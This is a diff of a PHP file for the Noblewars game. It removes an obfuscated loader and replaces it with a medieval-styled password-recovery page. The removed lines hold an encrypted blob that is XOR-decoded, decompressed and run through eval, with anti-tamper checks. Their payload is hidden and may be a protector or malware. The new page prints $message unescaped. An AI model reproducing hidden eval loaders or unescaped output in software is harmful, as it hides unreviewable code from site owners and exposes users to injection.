@@ -1,24 +1,132 @@
 <?php
-$ocsfynxnyk="a10ae7baf8e50bd9cb6cdef3a6ee0c49";
-$vvbkxjjjp="58025250560754515e0d56045306520f535a0f5b565c000702575c5d015a0500";
-$foapej="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";
-$pwdroltbfs=file_get_contents(__FILE__);
-$yrjomfap=str_replace($foapej,"",$pwdroltbfs);
-if(strpos($yrjomfap,"ec"."ho")!==false||strpos($yrjomfap,"pr"."int")!==false||strpos($yrjomfap,"var_"."dump")!==false||strpos($yrjomfap,"file_put_"."contents")!==false||strpos($yrjomfap,"fw"."rite")!==false){die();}
-$kvxxzshy=str_replace(array($ocsfynxnyk,$vvbkxjjjp),array("SP_ea92be22","KP_7d590698"),$pwdroltbfs);
-$wdehhjs=md5($kvxxzshy);
-$rneeqmlj=hex2bin($vvbkxjjjp);
-$lbgtohuyo="";
-$enrqjwx=strlen($wdehhjs);
-for($pomohsqlmn=0;$pomohsqlmn<$enrqjwx;$pomohsqlmn++){
-$lbgtohuyo.=chr(ord($rneeqmlj[$pomohsqlmn])^ord($wdehhjs[$pomohsqlmn]));
-}
-$jkmecjmyl=base64_decode($foapej);
-$gzyiaftmx=strlen($jkmecjmyl);
-$qzpfisspd="";
-$hhownxe=strlen($lbgtohuyo);
-for($pomohsqlmn=0;$pomohsqlmn<$gzyiaftmx;$pomohsqlmn++){
-$qzpfisspd.=$jkmecjmyl[$pomohsqlmn]^$lbgtohuyo[$pomohsqlmn%$hhownxe];
-}
-$cxricfacl="gzun"."compress";
-eval('?>' . $cxricfacl($qzpfisspd) . '<?php ');
+/**
+ * RECUPERAÇÃO DE SENHA MODERNA - Noblewars
+ * Layout de ecrã inteiro com fundo cinematográfico.
+ */
+?>
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?= __('public.password_recovery.page_title') ?> | Noblewars</title>
+    <link rel="shortcut icon" href="graphic/icons/nwfavicon.ico" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=MedievalSharp&family=Outfit:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --medieval-gold: #c2b280; --medieval-brown: #3e2723; --parchment: #f4e4bc; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Outfit', sans-serif; background: #2b1d12; color: #f4e4bc;
+            background-image: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.5)), url('graphic/index/bg_modern.png');
+            background-size: cover; background-position: center; background-attachment: fixed;
+            min-height: 100vh; display: flex; flex-direction: column; overflow: hidden;
+        }
+
+        .navbar {
+            display: flex; justify-content: space-between; align-items: center; width: 100%;
+            padding: 15px 5%; background: rgba(43, 29, 18, 0.8);
+            border-bottom: 2px solid var(--medieval-gold);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.4); backdrop-filter: blur(8px);
+            position: sticky; top: 0; z-index: 1000;
+        }
+        .logo { font-family: 'MedievalSharp', cursive; font-size: 28px; color: var(--medieval-gold); text-decoration: none; text-shadow: 2px 2px 0 #000; }
+        .nav-links a { margin-left: 20px; color: white; text-decoration: none; font-size: 14px; font-weight: bold; opacity: 0.8; }
+        .nav-links a:hover { opacity: 1; color: var(--medieval-gold); }
+
+        .main-content {
+            flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px;
+        }
+
+        .recovery-card {
+            background-color: var(--parchment);
+            background-image: radial-gradient(circle at center, rgba(255, 255, 255, 0.4) 0%, rgba(255, 255, 255, 0) 70%),
+                url("data:image/svg+xml,%3Csvg width='200' height='200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.1'/%3E%3C/svg%3E");
+            border: 3px solid var(--medieval-gold); border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), inset 0 0 40px rgba(160, 82, 45, 0.2);
+            padding: 30px; width: 100%; max-width: 480px; color: var(--medieval-brown);
+            position: relative; transform: rotate(-0.5deg);
+        }
+
+        .recovery-card::before {
+            content: ""; position: absolute; top: 10px; left: 10px; right: 10px; bottom: 10px;
+            border: 1px solid rgba(93, 64, 55, 0.2); border-radius: 8px; pointer-events: none;
+        }
+
+        h2 { font-family: 'MedievalSharp', cursive; font-size: 36px; text-align: center; margin-bottom: 25px; border-bottom: 2px solid #8c5f0d; padding-bottom: 10px; }
+        
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-family: 'MedievalSharp', cursive; font-size: 16px; margin-bottom: 5px; font-weight: bold; }
+        
+        input {
+            width: 100%; padding: 12px; background: #e6d5ac; border: 2px solid #5d4037;
+            border-radius: 4px; color: #2d1b10; font-family: 'MedievalSharp', cursive; font-size: 16px;
+            outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: #8b5a2b; box-shadow: 0 0 8px rgba(139, 90, 43, 0.3); }
+
+        .medieval-button {
+            display: block; width: 100%; height: 50px; line-height: 50px;
+            background: linear-gradient(to bottom, #8b5a2b 0%, #6d4c41 50%, #5d4037 100%);
+            border: 2px solid #3e2723; border-radius: 4px; color: #f5f5dc;
+            font-family: 'MedievalSharp', cursive; font-size: 24px; text-align: center;
+            text-decoration: none; text-shadow: 2px 2px 2px #000; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.4); margin-top: 25px; transition: 0.2s;
+        }
+        .medieval-button:hover { transform: translateY(-2px); filter: brightness(1.1); }
+
+        .back-link { display: block; text-align: center; margin-top: 20px; color: #7d510f; font-weight: bold; text-decoration: none; font-size: 14px; }
+        .back-link:hover { text-decoration: underline; }
+
+        .error-box { background: rgba(139, 35, 35, 0.1); border: 1px solid #8b2323; color: #8b2323; padding: 10px; border-radius: 4px; margin-bottom: 20px; font-weight: bold; text-align: center; }
+        .success-box { background: rgba(46, 125, 50, 0.1); border: 1px solid #2e7d32; color: #2e7d32; padding: 10px; border-radius: 4px; margin-bottom: 20px; font-weight: bold; text-align: center; }
+
+        .footer-info { position: fixed; bottom: 20px; color: var(--medieval-gold); font-size: 12px; opacity: 0.7; }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <a href="index.php" class="logo"><img width="80" height="80" src="graphic/index/noblewars.png" alt="Noblewars Logo" ></a>
+        <div class="nav-links">
+            <?php foreach ($linki as $link => $value): ?>
+                <a href="<?= $link ?>"><?= $value ?></a>
+            <?php endforeach; ?>
+            <div style="margin-left: 20px; display: inline-block; vertical-align: middle;">
+                <?php include __DIR__ . '/components/language_selector_public.php'; ?>
+            </div>
+        </div>
+    </nav>
+
+    <div class="main-content">
+        <div class="recovery-card">
+            <h2><?= __('public.password_recovery.heading') ?></h2>
+
+            <?php if (!empty($message)): ?>
+                <div class="success-box"><i class="fas fa-check-circle"></i> <?= $message ?></div>
+            <?php endif; ?>
+
+            <?php if (!empty($error)): ?>
+                <div class="error-box"><i class="fas fa-exclamation-triangle"></i> <?= htmlspecialchars($error) ?></div>
+            <?php endif; ?>
+
+            <form method="post">
+                <div class="form-group">
+                    <label for="email"><i class="fas fa-envelope"></i> <?= __('public.password_recovery.email_label') ?></label>
+                    <input type="email" id="email" name="email" required placeholder="<?= __('public.password_recovery.email_placeholder') ?>" autofocus>
+                </div>
+
+                <button class="medieval-button" type="submit"><?= __('public.password_recovery.submit_button') ?></button>
+            </form>
+
+            <a href="index.php" class="back-link"> <?= __('public.password_recovery.back_to_login') ?></a>
+        </div>
+    </div>
+
+    <div class="footer-info">
+        &copy; <?= date('Y') ?> by Ice41 - Nobles Wars
+    </div>
+
+</body>
+</html>
